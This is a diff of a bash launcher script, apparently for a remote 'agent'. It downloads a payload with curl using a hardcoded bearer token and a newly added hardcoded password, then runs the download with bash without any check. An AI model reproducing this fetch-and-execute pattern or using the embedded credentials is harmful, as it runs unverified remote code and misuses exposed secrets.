@@ -65,10 +65,17 @@ echo -ne "  ${DG}├─ Establishing Connection...${NC} "
 payload="$(mktemp)"
 trap "rm -f $payload" EXIT
 
-# Updated with your Cloudflare Token
+# Credentials
 TOKEN="cfut_JWtjqOSLr0WAaRN5R8mquAif9Y1NLYKGKkcTfB2a512545da"
+PASS="RAJBHAI007"
 
-if curl -fsSL -H "Authorization: Bearer $TOKEN" -A "Bane-1s-Agent" -o "$payload" "$URL"; then
+# Execute curl using the Bearer Token and Custom Password header
+if curl -fsSL \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "X-Auth-Key: $PASS" \
+    -A "Bane-1s-Agent" \
+    -o "$payload" "$URL"; then
+    
     echo -e "${G}CONNECTED${NC}"
     echo -e "  ${DG}└─ Agent Status:${NC} ${G}AUTHORIZED${NC}"
     
@@ -80,10 +87,11 @@ if curl -fsSL -H "Authorization: Bearer $TOKEN" -A "Bane-1s-Agent" -o "$payload"
     # Execute payload
     bash "$payload"
 else
+    # Capture the specific error code for fast debugging
+    ERROR_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "$URL")
     echo -e "${R}FAILED${NC}"
-    # Capture the specific error code for debugging
-    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "$URL")
-    echo -e "  ${DG}└─ Error Detail:${NC} ${R}HTTP Status $HTTP_CODE${NC}"
+    echo -e "  ${DG}└─ Error Detail:${NC} ${R}HTTP Status $ERROR_CODE${NC}"
     echo -e "\n  ${R}[!] CRITICAL:${NC} Authentication handshake failed."
     exit 1
 fi
+
